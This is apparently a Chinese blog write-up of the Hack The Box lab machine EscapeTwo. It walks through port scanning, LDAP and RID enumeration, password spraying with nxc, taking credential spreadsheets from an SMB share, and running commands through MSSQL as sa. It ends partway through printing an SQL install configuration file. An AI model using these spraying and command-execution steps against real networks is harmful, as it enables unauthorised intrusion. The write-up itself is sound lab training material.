---
title: EscapeTwo # 从 Astro 的 title 转换
date: 2025/05/10 09:00:00 # 从 Astro 的 published 转换，并添加一个默认时间 (例如，早上9点)
# updated: YYYY-MM-DD HH:MM:SS # 如果有更新日期，可以自行添加
description: '[HTB_EscapeTwo] | 初探Windows渗透' # 从 Astro 的 description 转换
cover: /images/EscapeTwo_cover.png # 从 Astro 的 image 转换，注意路径前添加 '/' 表示根目录
tags: # 从 Astro 的 tags 转换
  - 渗透测试
  - Windows提权
  - ldap
  - nxc
  - ridbrute
categories: # 从 Astro 的 category 转换，Hexo 常用 categories (复数)
  - Writeup
# 以下是 Redefine 主题特有或常用的可选字段，根据您的需求选择性添加
# published: true # 对应 Astro 的 draft: false。在 Hexo 中，默认就是发布的，不需要这个字段。草稿文章通常放在 _drafts 文件夹。
# lang: 'zh' # Redefine 主题支持多语言配置，但通常在主题的 _config.yml 中配置，而非单篇文章。如果你有特殊需求，可以在文章中设置，但一般不常用。
# author: 您的名字 # 可选，如需显示文章作者
# avatar: /img/your-avatar.png # 可选，如需显示作者头像
# password: your_secret_password # 文章加密，根据需要添加
# message: 本文已加密，请输入密码。 # 加密提示信息
# encrypt_abstract: 加密文章摘要。
# sticky: 1 # 置顶文章，数值越大优先级越高
# comment: true # 是否开启评论，默认开启
# toc: true # 是否显示目录，默认开启
# math: false # 是否开启数学公式，默认关闭
# mermaid: false # 是否开启 Mermaid 图表，默认关闭
---

## Enum

### nmap

```bash
┌──(kali㉿kali)-[~/HTB/Escapetwo]
└─$ cat ./nmapscan/details.nmap 
# Nmap 7.94SVN scan initiated Sat May 10 10:00:34 2025 as: nmap -sT -sC -sV -O -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49689,49690,49691,49706,49722,49731,49794 -oA ./nmapscan/details 10.10.11.51
Nmap scan report for sequel.htb (10.10.11.51)
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-10 13:40:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-10T13:41:59+00:00; -20m27s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-10T13:41:59+00:00; -20m27s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-05-10T13:41:59+00:00; -20m27s from scanner time.
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-05-10T13:23:13
|_Not valid after:  2055-05-10T13:23:13
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-10T13:41:59+00:00; -20m27s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-10T13:41:59+00:00; -20m27s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49731/tcp open  msrpc         Microsoft Windows RPC
49794/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -20m26s, deviation: 0s, median: -20m27s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-10T13:41:24
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 10 10:02:29 2025 -- 1 IP address (1 host up) scanned in 114.94 seconds
```

### ldap

```bash
┌──(kali㉿kali)-[~/HTB/Escapetwo]
└─$ ldapsearch  -x -H ldap://10.10.11.51 -s base        
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=sequel,DC=htb
ldapServiceName: sequel.htb:dc01$@SEQUEL.HTB
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=sequel,DC=htb
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
 ation,DC=sequel,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=sequel,DC=htb
namingContexts: DC=sequel,DC=htb
namingContexts: CN=Configuration,DC=sequel,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=sequel,DC=htb
namingContexts: DC=DomainDnsZones,DC=sequel,DC=htb
namingContexts: DC=ForestDnsZones,DC=sequel,DC=htb
isSynchronized: TRUE
highestCommittedUSN: 217383
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=sequel,DC=htb
dnsHostName: DC01.sequel.htb
defaultNamingContext: DC=sequel,DC=htb
currentTime: 20250510141317.0Z
configurationNamingContext: CN=Configuration,DC=sequel,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

### nxc

#### rid-brute

rid-brute的原理参考mane大佬写的吧https://manesec.github.io/2023/10/28/2023/2023-10-rid-brute/

我在这里摘录一些mane的话，~~也许我可能在下一周内从数据包的角度来看一看sid爆破呢？~~

> 在 Windows 也是如此，新建的用户 rid 也是从 1000 开始，为了不和 build in 用户重合，build in 用户会从 500 开始，一些 buildin 组也会有 rid（比如：512代表只读域控制器）administrator 的 rid 通常是 500。
>
> 为了解决在多个 DC 中不同子域的 RID 重合问题，Windows 默认会给每个 DC 安排一个 domain sid，然后把 DC 下的用户合成新的 SID，以识别用户来自哪里。
>
> [![image](https://files.manesec.com/file/maneimg1/2023/10/ridbrute/image-20231028155449-lp2kt3p.png)](https://files.manesec.com/file/maneimg1/2023/10/ridbrute/image-20231028155449-lp2kt3p.png)
>
> 例如：
>
> - 当 domain 的 sid 为 
>
>   `4254423774-1266059056-3197185112`
>
> - 默认的 users 通常以 
>
>   `S-1-5-21`
>
>    开头 ，合起就是 
>
>   `S-1-5-21-4254423774-1266059056-3197185112`
>
> - 因为 administrator 的 rid 是 500，在后面加上 500 就变成了 
>
>   `S-1-5-21-4254423774-1266059056-3197185112-500`

```bash
┌──(kali㉿kali)-[~/HTB/Escapetwo]
└─$ nxc smb 10.10.11.51 --shares -u rose -p KxEPkKe6R8su --rid-brute 100000
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ            
SMB         10.10.11.51     445    DC01             498: SEQUEL\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.51     445    DC01             500: SEQUEL\Administrator (SidTypeUser)
SMB         10.10.11.51     445    DC01             501: SEQUEL\Guest (SidTypeUser)
SMB         10.10.11.51     445    DC01             502: SEQUEL\krbtgt (SidTypeUser)
SMB         10.10.11.51     445    DC01             512: SEQUEL\Domain Admins (SidTypeGroup)
SMB         10.10.11.51     445    DC01             513: SEQUEL\Domain Users (SidTypeGroup)
SMB         10.10.11.51     445    DC01             514: SEQUEL\Domain Guests (SidTypeGroup)
SMB         10.10.11.51     445    DC01             515: SEQUEL\Domain Computers (SidTypeGroup)
SMB         10.10.11.51     445    DC01             516: SEQUEL\Domain Controllers (SidTypeGroup)
SMB         10.10.11.51     445    DC01             517: SEQUEL\Cert Publishers (SidTypeAlias)
SMB         10.10.11.51     445    DC01             518: SEQUEL\Schema Admins (SidTypeGroup)
SMB         10.10.11.51     445    DC01             519: SEQUEL\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.51     445    DC01             520: SEQUEL\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.51     445    DC01             521: SEQUEL\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.51     445    DC01             522: SEQUEL\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.51     445    DC01             525: SEQUEL\Protected Users (SidTypeGroup)
SMB         10.10.11.51     445    DC01             526: SEQUEL\Key Admins (SidTypeGroup)
SMB         10.10.11.51     445    DC01             527: SEQUEL\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.51     445    DC01             553: SEQUEL\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.51     445    DC01             571: SEQUEL\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.51     445    DC01             572: SEQUEL\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.51     445    DC01             1000: SEQUEL\DC01$ (SidTypeUser)
SMB         10.10.11.51     445    DC01             1101: SEQUEL\DnsAdmins (SidTypeAlias)
SMB         10.10.11.51     445    DC01             1102: SEQUEL\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.51     445    DC01             1103: SEQUEL\michael (SidTypeUser)
SMB         10.10.11.51     445    DC01             1114: SEQUEL\ryan (SidTypeUser)
SMB         10.10.11.51     445    DC01             1116: SEQUEL\oscar (SidTypeUser)
SMB         10.10.11.51     445    DC01             1122: SEQUEL\sql_svc (SidTypeUser)
SMB         10.10.11.51     445    DC01             1128: SEQUEL\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.10.11.51     445    DC01             1129: SEQUEL\SQLRUserGroupSQLEXPRESS (SidTypeAlias)
SMB         10.10.11.51     445    DC01             1601: SEQUEL\rose (SidTypeUser)
SMB         10.10.11.51     445    DC01             1602: SEQUEL\Management Department (SidTypeGroup)
SMB         10.10.11.51     445    DC01             1603: SEQUEL\Sales Department (SidTypeGroup)
SMB         10.10.11.51     445    DC01             1604: SEQUEL\Accounting Department (SidTypeGroup)
SMB         10.10.11.51     445    DC01             1605: SEQUEL\Reception Department (SidTypeGroup)
SMB         10.10.11.51     445    DC01             1606: SEQUEL\Human Resources Department (SidTypeGroup)
SMB         10.10.11.51     445    DC01             1607: SEQUEL\ca_svc (SidTypeUser)

```

整理一下内容得到可能的用户名，然后执行一下密码喷洒。

```bash
┌──(kali㉿kali)-[~/HTB/Escapetwo]
└─$ nxc smb 10.10.11.51 --shares -u ./rids  -p KxEPkKe6R8su  --continue-on-success
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Enterprise Read-only Domain Controllers:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Administrator:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Guest:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\krbtgt:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Domain Admins:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Domain Users:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Domain Guests:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Domain Computers:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Domain Controllers:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Cert Publishers:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Schema Admins:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Enterprise Admins:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Group Policy Creator Owners:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Read-only Domain Controllers:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Cloneable Domain Controllers:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Protected Users:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Key Admins:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Enterprise Key Admins:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\RAS and IAS Servers:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Allowed RODC Password Replication Group:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Denied RODC Password Replication Group:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\DC01$:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\DnsAdmins:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\DnsUpdateProxy:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\michael:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ryan:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sql_svc:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\SQLServer2005SQLBrowserUser$DC01:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\SQLRUserGroupSQLEXPRESS:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Management Department:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Sales Department:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Accounting Department:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Reception Department:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Human Resources Department:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ca_svc:KxEPkKe6R8su STATUS_LOGON_FAILURE
```

没有一个成功的，很气。转头看一眼smb服务

### smb

通过凭据登录进去找到了两个文件

```bash
┌──(kali㉿kali)-[~/HTB/Escapetwo]
└─$ smbclient "//10.10.11.51/Accounting Department" -U rose 
Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
mkfifo         more           mput           newer          notify         
open           posix          posix_encrypt  posix_open     posix_mkdir    
posix_rmdir    posix_unlink   posix_whoami   print          prompt         
put            pwd            q              queue          quit           
readlink       rd             recurse        reget          rename         
reput          rm             rmdir          showacls       setea          
setmode        scopy          stat           symlink        tar            
tarmode        timeout        translate      unlock         volume         
vuid           wdel           logon          listconnect    showconnect    
tcon           tdis           tid            utimes         logoff         
..             !              
smb: \> ls
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024

                6367231 blocks of size 4096. 923804 blocks available
smb: \> get accounting_2024.xlsx
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (11.0 KiloBytes/sec) (average 11.0 KiloBytes/sec)
smb: \> get accounts.xlsx
getting file \accounts.xlsx of size 6780 as accounts.xlsx (7.8 KiloBytes/sec) (average 9.5 KiloBytes/sec)
smb: \> exit

```

拿出来打开看看

#### hex edit fix file head

直接打开发现文件头损坏读不出来拿到winhex里面修改成正确的文件头

accounting_2024.xlsx

![image-20250510225757854](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250510225757854.png)

accounts.xlsx

| First Name | Last Name | Email                                         | Username | Password         |
| ---------- | --------- | --------------------------------------------- | -------- | ---------------- |
| Angela     | Martin    | [angela@sequel.htb](mailto:angela@sequel.htb) | angela   | 0fwz7Q4mSpurIt99 |
| Oscar      | Martinez  | [oscar@sequel.htb](mailto:oscar@sequel.htb)   | oscar    | 86LxLBMgEWaKUnBG |
| Kevin      | Malone    | [kevin@sequel.htb](mailto:kevin@sequel.htb)   | kevin    | Md9Wlq1E5bZnVDVo |
| NULL       | NULL      | [sa@sequel.htb](mailto:sa@sequel.htb)         | sa       | MSSQLP@ssw0rd!   |

得到了一些账号和密码，继续提取可能的username和password做一下密码碰撞。

#### nxc

```bash
┌──(kali㉿kali)-[~/HTB/Escapetwo]
└─$ nxc smb 10.10.11.51 --shares -u user.list   -p passwd.list --continue-on-success
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:KxEPkKe6R8su STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\:KxEPkKe6R8su STATUS_LOGON_FAILURE 
```

得到了用户`sequel.htb\oscar:86LxLBMgEWaKUnBG`重新看一眼smb以及看看是否有wrm权限。结果都没有什么发现

```bash
┌──(kali㉿kali)-[~/HTB/Escapetwo]
└─$ nxc winrm 10.10.11.51  -u oscar -p 86LxLBMgEWaKUnBG 
WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\oscar:86LxLBMgEWaKUnBG
```

可以注意到之前有一个我们很感兴趣的用户名和密码 `sa:MSSQLP@ssw0rd!`用nxc看一下是否能够登录

```bash
┌──(kali㉿kali)-[~/HTB/Escapetwo]
└─$ nxc mssql sequel.htb -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth -X 'whoami'             
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.10.11.51     1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.10.11.51     1433   DC01             sequel\sql_svc
```

成功登录，那么我们反弹一个shell出来。

```powershell
PS C:\Windows\system32> whoami
sequel\sql_svc
PS C:\Windows\system32> 
```

翻翻找找又能翻到一个密码

```powershell
PS C:\sql2019\ExpressAdv_ENU> type AUTORUN.INF
[autorun]
OPEN=SETUP.EXE
ICON=SETUP.EXE,0
PS C:\sql2019\ExpressAdv_ENU> type sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
